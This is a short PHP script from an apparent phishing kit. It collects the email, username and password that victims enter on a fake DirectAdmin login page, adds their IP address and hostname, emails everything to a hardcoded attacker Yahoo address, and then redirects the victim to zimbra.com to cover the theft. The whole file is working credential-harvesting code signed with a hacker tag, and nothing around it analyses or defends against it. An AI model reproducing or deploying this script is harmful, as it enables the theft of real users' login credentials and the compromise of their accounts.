<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userinfo = $_POST['datacheck'];
$message  = "==================+[ DirectAdmin ReZulz ]+==================\n";
$message .= "Email Address  : ".$_POST['email']."\n";
$message .= "Username  : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n\n";
$message .= "Confirm Password  : ".$_POST['confirmpassword']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "=============+ Hacked in 2011 By [ Mr.HiTman From Jordan ] +=============\n";

$send= "gavinbrent2012@yahoo.com";

$subject = "HiTmax! | DirectAdmin | $ip";
$headers = "From:  HiTmax!<HiTman@darkcity.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
mail($datacheck,$subject,$message,$headers);
header("Location: http://www.zimbra.com/");
?>